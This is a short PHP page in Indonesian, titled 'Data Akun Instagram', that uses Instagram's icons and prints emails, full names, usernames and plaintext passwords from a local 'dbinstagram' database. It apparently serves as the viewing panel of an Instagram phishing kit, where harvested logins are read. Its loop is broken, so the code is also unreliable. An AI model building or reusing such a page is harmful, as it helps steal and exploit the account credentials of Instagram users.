<!DOCTYPE html>
<html>
<html lang="id" class="no-js not-logged-in ">
	<head>
	  <link rel="mask-icon" href="//instagramstatic-a.akamaihd.net/h1/images/ico/favicon.svg/9d8680ab8a3c.svg" color="#262626">
	  <link rel="shortcut icon" type="image/x-icon" href="//instagramstatic-a.akamaihd.net/h1/images/ico/favicon.ico/dfa85bb1fd63.ico">
	<title>Data Akun Instagram</title>
</head>
<body>
<?php
	$koneksi=mysql_connect("localhost","root","") or die ("Gagal connect ke server");
	mysql_select_db("dbinstagram") or die ("Gagal membuka database");
?>
	<center>DATA AKUN INSTAGRAM<hr>
	<table border=1>
	<tr><td><center>Email</center></td>
		<td><center>Fullname</center></td>
		<td><center>Username</center></td>
		<td><center>Password</center></td>
	</tr>
<?php
	$sql="select * from tbinstagram";
	$hasil=mysql_query($sql,$koneksi) or die ("Gagal melakukan Query");;
	while ($row=mysql_fetch_array($hasil))
?>
	<tr><td><?php echo $row ['email']; ?></td>
		<td><?php echo $row ['fullname']; ?></td>
		<td><?php echo $row ['username']; ?></td>
		<td><?php echo $row ['password']; ?></td>
	</tr>
<?php
	mysql_close($koneksi);
?>
</table>
</body>
</html>